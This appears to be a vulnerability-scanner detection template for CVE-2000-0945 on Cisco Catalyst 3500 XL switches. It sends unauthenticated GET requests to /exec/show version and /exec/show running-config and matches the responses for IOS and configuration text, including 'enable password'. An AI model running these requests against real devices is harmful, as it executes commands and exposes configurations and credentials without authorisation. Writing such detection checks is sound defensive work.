[info]
author = "ave"
description = "检测 Cisco Catalyst 3500 XL 交换机 Web 配置接口未授权命令执行漏洞。当 enable 密码未设置时，访问 /exec/ 目录可执行任意系统命令。"
id = "POC-AVE-2000-0691"
name = "Cisco Catalyst 3500 XL Arbitrary Command Execution PoC"
severity = "critical"
tags = ["cve-2000-0945"]
vuln_id = [
    "CVE-2000-0945",
    "AVE-2000-0691",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/exec/show version"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Cisco Internetwork Operating System",
    "IOS",
    "show version",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/exec/show running-config"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "running-config",
    "Current configuration",
    "enable password",
]
